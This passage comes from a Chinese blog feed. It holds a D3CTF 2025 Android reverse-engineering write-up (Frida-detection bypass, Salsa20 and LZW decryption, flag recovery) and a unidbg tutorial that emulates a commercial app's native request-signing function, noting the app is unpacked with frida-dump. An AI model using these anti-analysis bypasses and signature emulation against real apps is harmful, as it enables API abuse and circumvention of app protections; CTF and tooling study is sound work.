0x565c0138487b57e4b76d0924163f67facb17a77f83e354cc3c8432879dab4611c2442cdd73f71c9e6cb4e56a7c45a403148e6d558f986ec6505882ae095c34d2+1d = 0x2e4f4254c529f4ef40d28a6595e60bb28b1d11ab13328000fb63cf77836a423259af8a8881d73e1868cd66bbd78920f38033f9f1e0e406b82f0aee50fdbe2567e0ac329e80e9abbb7075f4711157844e9fcb666200b1c4ef05b3cc66278221c9e6bd7250caf2be2a3793cf1f2dd43918d6ead0ee851eccf43e48750b6fab2f9e = 65537c = 0xc901acacbb426c9c447acda82513965ccc3faf6c9dc58d24ed34b62c7fb1548f9ad06b9355c7d20704cfdfdfc89a3f893801e31719564683fdc7de26d807ed27f898edb3efd51b6e8e2a192d6a0929554342adfed541cd8399da0fbacfeaa5b608b887fd74f4f0e31f9bb5816c54163b8e46d27553798233bef6eaf848c64en = p * qmm = pow(c,e,n)print(&quot;解密后的flag（字符串）:&quot;, long_to_bytes(mm).decode())</code></pre><p>确实，如同check函数中的log提示，这是fake flag。</p><p>回顾前面的分析过程，getkeysoundindex并没有生成打乱的0-11，并且在尝试调试或者frida hook的时候发现有检测，想hook只能通过附加进程调试，但是在这个so文件里并没有看到很明显的检测逻辑，同时lib目录里还有一个so文件，并且是可以在libD3Piano.so中验证另一个so文件的可疑点<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603201006676.png" alt="image-20250603201006676"></p><p>libD3Piano.so链接了另外的两个库，但是很明显使用了libgmp.so，没有使用另一个所以 这个libMediaPlayer.so肯定在 init_array里面藏了东西。因为在链接时会调用 init_array 的内容。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603201326760.png" alt="image-20250603201326760"></p><p>这其中可疑的函数只有<strong>sub_8938CC()</strong><br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603201354366.png" alt="image-20250603201354366"></p><p>初始化了三个信号量，创建了四个线程，每个线程都执行不同的函数</p><ul><li>从 unk_BBBF04 到 unk_BBBF34，每间隔 16 字节初始化一个信号量（sem_init），初值为 0。</li><li>4 个线程，每个线程执行的函数来自 <code>off_BBAD20</code> 表中的函数指针（共 4 个）。</li></ul><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603202622501.png" alt="image-20250603202622501"></p><p>依次进行分析<br>fun1是Frida检测的逻辑</p><pre><code class="language-c++">__int64 fun1()&#123;  __int64 v0; // x0  __int64 *v2; // [xsp+48h] [xbp-388h]  __int64 *i; // [xsp+D0h] [xbp-300h]  __int64 v4; // [xsp+E0h] [xbp-2F0h]  _QWORD v5[3]; // [xsp+118h] [xbp-2B8h] BYREF  _QWORD v6[3]; // [xsp+130h] [xbp-2A0h] BYREF  _BYTE v7[16]; // [xsp+148h] [xbp-288h] BYREF  _QWORD v8[2]; // [xsp+158h] [xbp-278h] BYREF  _BYTE v9[16]; // [xsp+168h] [xbp-268h] BYREF  _QWORD v10[2]; // [xsp+178h] [xbp-258h] BYREF  _BYTE v11[16]; // [xsp+188h] [xbp-248h] BYREF  _BYTE v12[24]; // [xsp+198h] [xbp-238h] BYREF  _BYTE v13[24]; // [xsp+1B0h] [xbp-220h] BYREF  _BYTE v14[24]; // [xsp+1C8h] [xbp-208h] BYREF  _BYTE v15[344]; // [xsp+1E0h] [xbp-1F0h] BYREF  _BYTE v16[144]; // [xsp+338h] [xbp-98h] BYREF  __int64 v17; // [xsp+3C8h] [xbp-8h] BYREF  v17 = *(_QWORD *)(_ReadStatusReg(TPIDR_EL0) + 40);  sub_892D64(v14, &quot;/proc/self/task&quot;, 0);  sub_892DC8(v13);  sub_892DEC(v12);  sub_892E68();  sub_892E68();  sub_892E68();  sub_892E68();  sub_892E68();  sub_892E68();  sub_892EEC(v11, v14);  sub_892F50();  sub_892F20(v10, v9);  sub_892F7C(v9);  sub_892F50();  sub_892FA0(v8, v7);  sub_892F7C(v7);  while ( (sub_892FC8(v10, v8) &amp; 1) != 0 )  &#123;    v4 = sub_892FFC(v10);    v0 = sub_893060(v4);    sub_893074(v5, v0);    sub_893020(v6, v5, &quot;/comm&quot;);    sub_8930AC();    sub_9E4E94(v6);    sub_9E4E94(v5);    sub_8930E0(v15, v13, 24);    if ( (sub_893124(v15) &amp; 1) != 0 )    &#123;      sub_893150(v15, v12);      for ( i = (__int64 *)v16; i != &amp;v17; i += 3 )      &#123;        if ( sub_8931A8(v12, i, 0) != -1 )        &#123;          _ReadStatusReg(TPIDR_EL0);          exit(0);        &#125;      &#125;    &#125;    sub_893220(v15);    sub_89325C(v10);  &#125;  sub_892F7C(v8);  sub_892F7C(v10);  sub_892F7C(v11);  sleep(5u);  v2 = &amp;v17;  do  &#123;    sub_9E4E94(v2 - 3);    v2 -= 3;  &#125;  while ( v2 != (__int64 *)v16 );  sub_9E4E94(v12);  sub_893284(v13);  sub_893284(v14);  _ReadStatusReg(TPIDR_EL0);  return 0;&#125;</code></pre><p>通过检测线程名称来检测是否处于调试&#x2F;hook状态。检测到就直接exit退出，绕过检测直接nop掉exit函数。</p><p>剩下三个fun涉及到了信号量。执行顺序为fun3 -&gt; fun2 -&gt;fun4</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603203312384.png" alt="image-20250603203312384"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603203324671.png" alt="image-20250603203324671"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603203332915.png" alt="image-20250603203332915"></p><p>从fun3开始分析。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603203937195.png" alt="image-20250603203937195"></p><p>并且官方wp中还进行了如何进行hook的补充。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603204448926.png" alt="image-20250603204448926"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603204709478.png" alt="image-20250603204709478"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603204950110.png" alt="image-20250603204950110"></p><p>也可以进入**sub_893630()**函数里找一下，就是进去的第一个结构体。<br>func3→MyListener1、func2→MyListener2、func4→MyListener3。</p><p>func3 函数hook函数sub291B4。修改了返回值，然后func2运行。sub_896A28就是on_enter，sub_896A3C就是on_leave</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603205457465.png" alt="image-20250603205457465"></p><p>fun2 hook了基地址+0x29BD4地址的函数，就是check函数<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603205621847.png" alt="image-20250603205621847"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603205838316.png" alt="image-20250603205838316"></p><pre><code class="language-c++">__int64 __fastcall fun2_on_enter(__int64 a1, __int64 a2)&#123;  _BYTE *v2; // x0  unsigned __int8 *v3; // x0  __int64 v4; // x0  size_t n; // x0  __int64 result; // x0  char v7; // [xsp+14h] [xbp-ACh]  int n90_1; // [xsp+28h] [xbp-98h]  int n90; // [xsp+2Ch] [xbp-94h]  __int64 v12; // [xsp+30h] [xbp-90h]  int n11; // [xsp+4Ch] [xbp-74h] BYREF  _OWORD s2_[6]; // [xsp+50h] [xbp-70h] BYREF  int v15; // [xsp+B0h] [xbp-10h]  __int64 v16; // [xsp+B8h] [xbp-8h]  v16 = *(_ReadStatusReg(TPIDR_EL0) + 40);  v12 = (*(*a2 + 24LL))(a2, 2);  v15 = 0;  memset(s2_, 0, sizeof(s2_));  if ( sub_897580(a1 + 8) &lt; 0x5B )              // 检测长度  &#123;    result = sub_897630(a1 + 8, &amp;aCdefgabdegab[v12]);// &quot;CDEFGABdegab&quot;  &#125;  else  &#123;    for ( n90 = 0; n90 &lt;= 90; ++n90 )           // 长度大于90，先异或    &#123;      v7 = byte_BBACC2[n90];      v2 = sub_8975A0(a1 + 8, n90);      *v2 ^= v7;    &#125;    for ( n90_1 = 0; n90_1 &lt;= 90; ++n90_1 )     // 然后根据异或后的字符串，获取到对应的音调的下标保存到_obj    &#123;      for ( n11 = 0; n11 &lt;= 11; ++n11 )      &#123;        v3 = sub_8975A0(a1 + 8, n90_1);        if ( *v3 == aCdefgabdegab[n11] )        // &quot;CDEFGABdegab&quot;          sub_8975C4(&amp;obj_, &amp;n11);      &#125;    &#125;    (*(*a1 + 32LL))(a1);                        // 调用虚表函数1    v4 = sub_897580(a1 + 8);    (*(*a1 + 40LL))(a1, s2_, v4, a1 + 32, aCdefgabdegab, 2232865);// 调用虚表函数2    n = sub_897580(a1 + 8);    result = memcmp(&amp;s1_, s2_, n);              // cmp    if ( !result )      byte_BBBF00 = 1;  &#125;  _ReadStatusReg(TPIDR_EL0);  return result;&#125;</code></pre><p>on_leave修改返回值<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603210355580.png" alt="image-20250603210355580"></p><p>在func2 attach上函数后，func4执行。func4 hook 偏移0x28E80，也就是get_flag 函数的tostr。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603210458277.png" alt="image-20250603210458277"></p><p>其实就是把func2_on_enter函数里面根据异或加密后的音调在转换成12进制数，丢 给tostr。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603210700057.png" alt="image-20250603210700057"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603210717852.png" alt="image-20250603210717852"></p><p>那么现在就需要分析两个虚表函数加密，然后写出解密获取到输入的音调数组转换成 12 进制再转换成字符串输出就可以。那么来分析 enc1 与 enc2，enc1 函数有点抽象， 先分析enc2函数。很明显的salsa20加密。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603210808508.png" alt="image-20250603210808508"></p><p>可以尝试先解密enc2函数，key是类成员，找到类的构造函数。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603211101417.png" alt="image-20250603211101417"></p><p>这就是key，被加密了，解密一下。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603211427066.png" alt="image-20250603211427066"></p><pre><code class="language-python"># 模拟 .rodata 段中的两个 xmmword 数据（共32字节）xmmword_252578 = [    0x88, 0x9A, 0x93, 0xBC, 0x90, 0xB2, 0xBA, 0xA0, 0xC8,    0xCF, 0xA0, 0xBB, 0xCC, 0x9C, 0xC8, 0xB9]xmmword_252588 = [    0xA0, 0xCD, 0xCF, 0xCD, 0xCA, 0xD2, 0x8D, 0xCC, 0xA9,    0xBA, 0xAD, 0xAC, 0xBA, 0xDE, 0xDE, 0xDE]# 拼接两个 xmmword 成为 32 字节原始数据combined = xmmword_252578 + xmmword_252588# 对这 32 字节做按位取反（模仿 ~data 的行为）inverted = [~b &amp; 0xFF for b in combined]# 模拟 a1：前32字节占位，后32字节是结果a1 = [0] * 32 + inverted# 打印可见字符for byte in a1:    if 0x20 &lt;= byte &lt;= 0x7E:        print(chr(byte), end=&#39;&#39;)print()</code></pre><p>key： <strong>welCoME_70_D3c7F_2025-r3VERSE!!!</strong></p><p>解密代码</p><pre><code class="language-c++">#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;format&gt;#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;cstdint&gt;#include &lt;vector&gt;#define ROTL(a, b) ((((uint32_t)(a)) &lt;&lt; ((uint32_t)(b))) | (((uint32_t)(a)) &gt;&gt; (32 - ((uint32_t)(b)))))#define QUARTERROUND(a, b, c, d) \    a += b;                      \    d ^= a;                      \    d = ROTL(d, 16);             \    c += d;                      \    b ^= c;                      \    b = ROTL(b, 12);             \    a += b;                      \    d ^= a;                      \    d = ROTL(d, 8);              \    c += d;                      \    b ^= c;                      \    b = ROTL(b, 7);unsigned char flag_enc[74] = &#123;    0x2E, 0xD2, 0xDF, 0x53, 0x41, 0xE6, 0x51, 0xA2, 0xD0, 0x8E,    0x43, 0x59, 0x6F, 0xC4, 0x15, 0xAD,    0x97, 0xC2, 0x98, 0xBD, 0x11, 0x05, 0xFE, 0xFF, 0x96, 0x4C,    0xE8, 0x06, 0x50, 0x0E, 0x1D, 0xCA,    0x0E, 0xB2, 0x18, 0xCA, 0x06, 0x54, 0x2E, 0xFA, 0xCD, 0x19,    0xD2, 0x9E, 0xDB, 0x9E, 0x33, 0xCC,    0x5D, 0xAF, 0xED, 0x69, 0x4A, 0xEF, 0x17, 0xB8, 0xD8, 0x40,    0x14, 0x48, 0xCD, 0x37, 0xFC, 0xD0,    0x14, 0x5C, 0x3C, 0x31, 0xC9, 0x15, 0xE6, 0xCF, 0x77, 0x28&#125;;void salsa20_core(uint32_t out[16], const uint32_t in[16]) &#123;    uint32_t x[16];    int i;    for (i = 0; i &lt; 16; ++i) &#123;        x[i] = in[i];    &#125;    for (i = 0; i &lt; 10; ++i) &#123;        // 列轮        QUARTERROUND(x[0], x[4], x[8], x[12])        QUARTERROUND(x[5], x[9], x[13], x[1])        QUARTERROUND(x[10], x[14], x[2], x[6])        QUARTERROUND(x[15], x[3], x[7], x[11])        // 行轮        QUARTERROUND(x[0], x[1], x[2], x[3])        QUARTERROUND(x[5], x[6], x[7], x[4])        QUARTERROUND(x[10], x[11], x[8], x[9])        QUARTERROUND(x[15], x[12], x[13], x[14])    &#125;    for (i = 0; i &lt; 16; ++i) &#123;        out[i] = x[i] + in[i];    &#125;&#125;void salsa20_encrypt(uint8_t *ciphertext, size_t length, const uint8_t *key, const uint8_t *nonce, uint64_t counter) &#123;    uint32_t state[16];    uint32_t block[16];    size_t i, j;    uint8_t *keystream = (uint8_t *)block;    uint8_t *plaintext = (uint8_t *)malloc(74);    for (int n = 0; n &lt; 74; n++) &#123;        plaintext[n] = flag_enc[n];    &#125;    // 初始化状态    state[0] = 0x61707865;    state[1] = *(uint32_t *)&amp;key[0];    state[2] = *(uint32_t *)&amp;key[4];    state[3] = *(uint32_t *)&amp;key[8];    state[4] = *(uint32_t *)&amp;key[12];    state[5] = 0x3320646e;    state[6] = *(uint32_t *)&amp;nonce[0];    state[7] = *(uint32_t *)&amp;nonce[4];    state[8] = (uint32_t)(counter &amp; 0xFFFFFFFF);    state[9] = (uint32_t)(counter &gt;&gt; 32);    state[10] = 0x79622d32;    state[11] = *(uint32_t *)&amp;key[16];    state[12] = *(uint32_t *)&amp;key[20];    state[13] = *(uint32_t *)&amp;key[24];    state[14] = *(uint32_t *)&amp;key[28];    state[15] = 0x6b206574;    for (i = 0; i &lt; length; i += 64) &#123;        salsa20_core(block, state);        for (j = 0; j &lt; 64 &amp;&amp; i + j &lt; length; ++j) &#123;            ciphertext[i + j] = plaintext[i + j] ^ keystream[j];        &#125;        // 更新计数器        if (++state[8] == 0) &#123;            ++state[9];        &#125;    &#125;&#125;int main() &#123;    uint8_t key[] = &quot;welCoME_70_D3c7F_2025-r3VERSE!!!&quot;;    uint8_t nonce[] = &quot;CDEFGABdegab&quot;;    uint64_t counter = (uint64_t)0x221221;    uint8_t ciphertext[74];    salsa20_encrypt(ciphertext, sizeof(flag_enc), key, nonce, counter);    for (int i = sizeof(flag_enc) - sizeof(ciphertext); i &lt; sizeof(flag_enc); i++) &#123;        printf(&quot;%c&quot;, ciphertext[i]);    &#125;    return 0;&#125;</code></pre><p>后面的题解参考官方wp</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603212432087.png" alt="image-20250603212432087"></p><pre><code class="language-c++">void LZW_decode(std::vector&lt;uint8_t&gt; &amp;compressed)&#123;    std::unordered_map&lt;int, std::vector&lt;uint8_t&gt;&gt; dictionary;    for (int i = 0; i &lt; 256; ++i)    &#123;        dictionary[i] = &#123;static_cast&lt;uint8_t&gt;(i)&#125;;    &#125;    std::vector&lt;uint8_t&gt; codes;    for (uint8_t byte : compressed)    &#123;        codes.push_back(static_cast&lt;int&gt;(byte));    &#125;    std::vector&lt;uint8_t&gt; result;    uint8_t next_code = 0;    if (codes.empty())        return;    uint8_t prev_code = codes[0];    result.insert(result.end(), dictionary[prev_code].begin(), dictionary[prev_code].end());    for (size_t i = 1; i &lt; codes.size(); ++i)    &#123;        uint8_t curr_code = codes[i];        std::vector&lt;uint8_t&gt; entry;        if (curr_code == next_code)        &#123;            entry = dictionary[prev_code];            entry.push_back(dictionary[prev_code][0]);        &#125;        else if (dictionary.count(curr_code))        &#123;            entry = dictionary[curr_code];        &#125;        else        &#123;            std::cerr &lt;&lt; &quot;Error: Invalid code &quot; &lt;&lt; curr_code &lt;&lt; std::endl;            return;        &#125;        result.insert(result.end(), entry.begin(), entry.end());        std::vector&lt;uint8_t&gt; new_entry = dictionary[prev_code];        new_entry.push_back(entry[0]);        dictionary[next_code++] = new_entry;        prev_code = curr_code;    &#125;    std::string decoded_string(result.begin(), result.end());    std::cout &lt;&lt; decoded_string &lt;&lt; std::endl;&#125;int main()&#123;    uint8_t key[] = &quot;welCoME_70_D3c7F_2025-r3VERSE!!!&quot;;    uint8_t nonce[] = &quot;CDEFGABdegab&quot;;    uint64_t counter = (uint64_t)0x221221;    uint8_t ciphertext[74];    salsa20_encrypt(ciphertext, sizeof(flag_enc), key, nonce, counter);    std::vector&lt;uint8_t&gt; inputkeysname;    for (int i = 0; i &lt; sizeof(ciphertext); i++)    &#123;        inputkeysname.push_back(ciphertext[i]);    &#125;    LZW_decode(inputkeysname);    return 0;&#125;</code></pre><p>得到：</p><p><strong>bEbAACEBCGGGBdBECECbdaECCGGBAaAaedBEeDdGAdDaBgededFFBFeEaFGdFEbAFEAF gdgDBDBgeggbAeFagaEedbA</strong></p><pre><code class="language-python">from Crypto.Util.number import long_to_bytesenc = &quot;bEbAACEBCGGGBdBECECbdaECCGGBAaAaedBEeDdGAdDaBgededFFBFeEaFGdFEbAFEAFgdgDBDBgeggbAeFagaEedbA&quot;keys = &quot;CDEFGABdegab&quot;twelve = &quot;0123456789AB&quot;tmp = &quot;&quot;for i in enc:    tmp += twelve[keys.index(i)]tmp = int(tmp, 12)print(long_to_bytes(tmp).decode())</code></pre><p><strong>d3ctf{Fly1ng_Pi@n0_Key$_play_4_6e@utiful~melody}</strong></p><h4 id="三、结语"><a href="#三、结语" class="headerlink" title="三、结语"></a>三、结语</h4><p>好题，但感觉像像套着apk的PC题<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603213245716.png" alt="image-20250603213245716"></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>一次蛮不错体验的比赛，就是比赛时间不太友好(端午假期+周五晚八点-周六晚九点[因开赛时平台卡顿延迟了一小时])。其他题目就没复现啦，详见<a href="https://github.com/D-3CTF/D3CTF-2025-Official-Writeup">https://github.com/D-3CTF/D3CTF-2025-Official-Writeup</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从实践中学习unidbg使用(一)</title>
      <link href="/2025/05/28/%E4%BB%8E%E5%AE%9E%E8%B7%B5%E4%B8%AD%E5%AD%A6%E4%B9%A0unidbg%E4%BD%BF%E7%94%A8(%E4%B8%80)/"/>
      <url>/2025/05/28/%E4%BB%8E%E5%AE%9E%E8%B7%B5%E4%B8%AD%E5%AD%A6%E4%B9%A0unidbg%E4%BD%BF%E7%94%A8(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="从实践中学习unidbg使用-一"><a href="#从实践中学习unidbg使用-一" class="headerlink" title="从实践中学习unidbg使用(一)"></a>从实践中学习unidbg使用(一)</h1><h3 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h3><p>目标APK：lvzhou.apk</p><p>目标方法声明处的Dex：target.dex。样本APK在Java层做了加壳(360加固)，所以建议直接使用附件中的target.dex，或使用其他工具进行脱壳(frida-dump即可)</p><p>目标方法实现：liboasiscore.so</p><h3 id="二、任务描述"><a href="#二、任务描述" class="headerlink" title="二、任务描述"></a>二、任务描述</h3><p>首先先反编译target.dex，但使用jadx反编译时报错，于是就使用了GDA进行反编译，找到NativeApi类，其中s方法就是本篇的目标。</p><pre><code class="language-Java">package com.weibo.xvideo.NativeApi;import java.lang.Object;import java.lang.String;import java.lang.System;public final class NativeApi// class@0011ea from target.dex&#123;    public void NativeApi()&#123;       super();       System.loadLibrary(&quot;oasiscore&quot;);    &#125;    public native final String d(String p0);    public native final String dg(String p0,boolean p1);    public native final String e(String p0);    public native final String s(byte[] p0,boolean p1);&#125;</code></pre><p>然后写个Frida脚本hook一下，就先针对样本APK在运行时该方法传入的值和返回值进行分析。</p><pre><code class="language-js">setTimeout(function() &#123;    Java.perform(function() &#123;        let NativeApi = Java.use(&quot;com.weibo.xvideo.NativeApi&quot;);        NativeApi[&quot;s&quot;].implementation = function (bArr, z) &#123;            console.log(&#39;s is called&#39; + &#39;, &#39; + &#39;bArr: &#39; + bArr + &quot;, &quot; + &quot;z: &quot; + z);            let ret = this.s(bArr, z);            console.log(&#39;s ret value is &#39; + ret);            return ret;        &#125;;    &#125;);&#125;, 5000);</code></pre><p>这里需要注意的一个点就是因为这个APK加壳了，所以导致如果在指令中直接写</p><pre><code class="language-bash">frida -U -f &quot;com.weibo.xvideo&quot; -l hook.js</code></pre><p>会报错显示找不到进程，用以下指令</p><pre><code class="language-bash">frida -U -f &quot;com.sina.oasis&quot; -l hook.js</code></pre><p>就会接收到以下信息<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250528173853560.png"></p><p>把bArr转成ASCII码就是</p><blockquote><p>aid&#x3D;01A1H7Fp6UDqucgEerCNxpT41YVcU_j_LzwYFOs_L2l3_OoL8.&amp;cfrom&#x3D;28B5295010&amp;cuid&#x3D;0&amp;noncestr&#x3D;d101Ed45892MF20mM2LJ54i62EhwO3&amp;phone&#x3D;17816087093&amp;platform&#x3D;ANDROID&amp;timestamp&#x3D;1748421079454&amp;ua&#x3D;Google-Pixel3_oasis_3.5.8_Android__Android12&amp;version&#x3D;3.5.8&amp;vid&#x3D;2020786998479&amp;wm&#x3D;20004_90024</p><p>s ret value is 08e2a22b03840858f5e78858e4575db2</p></blockquote><p>就是程序发出的一个URL请求参数字符串，通常用于身份验证、用户追踪、设备标识、版本控制等。然后我们拿到传入的参数，接下来主动调用<strong>s</strong>方法</p><pre><code class="language-Java">setTimeout(function () &#123;  Java.perform(function () &#123;    function stringToBytes(str) &#123;      var javaString = Java.use(&quot;java.lang.String&quot;);      return javaString.$new(str).getBytes();    &#125;    let NativeApi = Java.use(&quot;com.weibo.xvideo.NativeApi&quot;);    let arg1 =     &quot;aid=01A1H7Fp6UDqucgEerCNxpT41YVcU_j_LzwYFOs_L2l3_OoL8.&amp;cfrom=28B5295010&amp;cuid=0&amp;noncestr=d101Ed45892MF20mM2LJ54i62EhwO3&amp;phone=17816087093&amp;platform=ANDROID&amp;timestamp=1748421079454&amp;ua=Google-Pixel3_oasis_3.5.8_Android__Android12&amp;version=3.5.8&amp;vid=2020786998479&amp;wm=20004_90024&quot;;    let arg2 = false;    let ret = NativeApi.$new().s(stringToBytes(arg1), arg2);    console.log(&quot;ret:&quot; + ret);  &#125;);&#125;, 5000);</code></pre><p>得到返回值是</p><blockquote><p>ret:1e3780f50056a3fea76b35592bfc3efc</p></blockquote><p>接下来我们开始使用unidbg，本篇的目的就是使用unidbg复现对s方法的调用，并得到Frida主动调用一致的结果。</p><h3 id="三、初始化"><a href="#三、初始化" class="headerlink" title="三、初始化"></a>三、初始化</h3><p>在test&#x2F;java路径下新建包和对应的类，包名，类名根据自己喜欢来就好</p><pre><code class="language-Java">package com.test0;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.LibraryResolver;import com.github.unidbg.arm.backend.DynarmicFactory;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.*;import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject;import com.github.unidbg.memory.Memory;import java.io.File;import java.nio.charset.StandardCharsets;//继承AbstractJni类之后，TEST0类就可以接收和响应Dalvik VM里本地方法调用，同时可以自定义JNI行为public class TEST0 extends AbstractJni &#123;    private final AndroidEmulator emulator;    private final DvmClass NativeApi;    private final VM vm;    public TEST0() &#123;        //模拟器初始化        emulator = AndroidEmulatorBuilder                //设置架构，执行速度ARM64相比ARM32会快一些，10%上下；而Unidbg对ARM32的支持和完善程度高于ARM64                .for64Bit()                //告诉unidbg使用Unicorn模拟器来执行指令                .addBackendFactory(new Unicorn2Factory(true))                //这个参数是用来设置进程名的，这个很重要，并且填写的是样本APK真实进程名，否则会带来隐患。若为空，一般Unidbg                //会将&quot;unidbg&quot;作为进程名返回。                .setProcessName(&quot;com.sina.oasis&quot;)                .build();//        //是否开启多线程//        //设置执行多少条指令切换一次线程//        emulator.getBackend().registerEmuCountHook(10000);//        //开启线程调度器//        emulator.getSyscallHandler().setEnableThreadDispatcher(true);        //获取模拟器的内存实例，也就是模拟器的内存操作接口        Memory memory = emulator.getMemory();        //创建一个库解析器，并设置Android版本为23(Android 6.0)        memory.setLibraryResolver(new AndroidResolver(23));        //创建虚拟机并指定apk文件        vm = emulator.createDalvikVM(new File(&quot;D:\\Compilation_Enviroment\\unidbg-master\\unidbg-android\\src\\test\\java\\com\\test0\\lvzhou.apk&quot;));        //设置当前类为虚拟机的JNI接口实现，即告诉虚拟机，如果 native 层调用 Java 方法、访问 Java 字段，使用我（这个类）来处理。        vm.setJni(this);        //打开 unidbg 的详细日志输出（verbose mode）        vm.setVerbose(true);        //加载so模块        DalvikModule dm = vm.loadLibrary(&quot;oasiscore&quot;, true);        //加载目标类        NativeApi = vm.resolveClass(&quot;com/weibo/xvideo/NativeApi&quot;);        dm.callJNI_OnLoad(emulator);    &#125;    public String calls() &#123;        String arg1 = &quot;aid=01A1H7Fp6UDqucgEerCNxpT41YVcU_j_LzwYFOs_L2l3_OoL8.&amp;cfrom=28B5295010&amp;cuid=0&amp;&quot; +                &quot;noncestr=d101Ed45892MF20mM2LJ54i62EhwO3&amp;phone=17816087093&amp;platform=ANDROID&amp;&quot; +                &quot;timestamp=1748421079454&amp;ua=Google-Pixel3_oasis_3.5.8_Android__Android12&amp;version=3.5.8&amp;&quot; +                &quot;vid=2020786998479&amp;wm=20004_90024&quot;;        Boolean arg2 = false;        String ret = NativeApi.newObject(null).callJniMethodObject(emulator, &quot;s([BZ)Ljava/lang/String;&quot;, arg1.getBytes(StandardCharsets.UTF_8), arg2).getValue().toString();        return ret;    &#125;    public static void main(String[] args) &#123;        TEST0 test0 = new TEST0();        String result = test0.calls();        System.out.println(&quot;Call s result:\n&quot; + result);    &#125;&#125;</code></pre><p>每行代码的含义都已注释好。<br>总的来说，就是进行了初始化模拟器、初始化内存、设置依赖库路径、创建虚拟机处理器、加载目标so、执行其JNI_Onload函数这一系列操作。</p><p>运行后得到我们的预期结果</p><blockquote><p>Call s result:<br>1e3780f50056a3fea76b35592bfc3efc</p></blockquote><h3 id="四、解释"><a href="#四、解释" class="headerlink" title="四、解释"></a>四、解释</h3><p>回顾DEX的反编译结果</p><pre><code class="language-Java">package com.weibo.xvideo.NativeApi;import java.lang.Object;import java.lang.String;import java.lang.System;public final class NativeApi// class@0011ea from target.dex&#123;    public void NativeApi()&#123;       super();       System.loadLibrary(&quot;oasiscore&quot;);    &#125;    public native final String d(String p0);    public native final String dg(String p0,boolean p1);    public native final String e(String p0);    public native final String s(byte[] p0,boolean p1);&#125;</code></pre><p>s方法是NativeApi类里的实例方法，因此在调用它时，需要先获取NativeApi类，再创建它的实例，最后才是发起调用，比如 Frida Call 代码就遵循这样的原则。Java.use获取类对象，$new()实例化，然后调用s方法。</p><p>Unidbg 作为 SO 模拟器，它没有加载 DEX，更没有运行 DEX，自然没法获取其中对应的类信息，那么它如何处理NativeApi以及更多的用户自定义的类库访问需求？这是 Unidbg 的核心问题之一。</p><p>首先，它构建了一套描述类库，或者说映射类库的机制。在 JAVA 层，一个类是Class，在 JNI 层，一个类是Jclass，而在 Unidbg 的 JNI 层，一个类是DvmClass。</p><p>在 Unidbg 中，通过vm.resolveClass(className)可以声明一个类名是className的DvmClass。</p><pre><code class="language-Java">DvmClass NativeApi = vm.resolveClass(&quot;com/weibo/xvideo/NativeApi&quot;);</code></pre><p>在类名的表述上，必须是全类名，旧版 Unidbg 上必须用斜杠&#x2F;作为分隔符，而 Unidbg 0.9.6 及以上的当前版本中，用斜杠&#x2F;或点号.分割都可行，因为resolveClass会替我们做这种替换。</p><p>resolveClass是一个可变参数方法，它的第二个参数是可变参数，用于进一步描述我们所构造的这个DvmClass的父类和接口。</p><p>举个例子，Android 的 Application 类</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250528184922392.png" alt="image-20250528184922392"></p><p>它继承自 ContextWrapper，ContextWrapper 继承自 Context，下面的图看起来更清晰。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250528184938746.png" alt="image-20250528184938746"></p><p>如果想用DvmClass表明 Application 的父类情况，可以像下面这样嵌套表示。</p><pre><code class="language-Java">DvmClass Context = vm.resolveClass(&quot;android/content/Context&quot;);DvmClass ContextWrapper = vm.resolveClass(&quot;android/content/ContextWrapper&quot;, Context);DvmClass Application = vm.resolveClass(&quot;android/app/Application&quot;, ContextWrapper);</code></pre><p>需要注意，这并不意味着我们必须非要这样才能表示 Application 